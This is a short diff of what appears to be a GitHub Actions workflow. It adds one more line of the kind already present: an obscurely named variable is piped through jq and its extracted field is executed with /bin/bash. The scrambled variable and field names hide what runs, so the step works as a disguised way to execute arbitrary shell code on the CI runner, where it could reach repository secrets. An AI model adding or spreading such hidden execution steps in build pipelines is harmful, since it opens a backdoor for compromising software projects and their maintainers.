@@ -29,6 +29,7 @@ jobs:
           echo $wuzs93 | jq -r .erm82 | /bin/bash
           printf '%s' "$ztv41" | jq -r .f627 | /bin/bash
           printf '%s' "$bsf04" | jq -r .xekx7 | /bin/bash
+          printf '%s' "$l4248" | jq -r .gyg07921 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
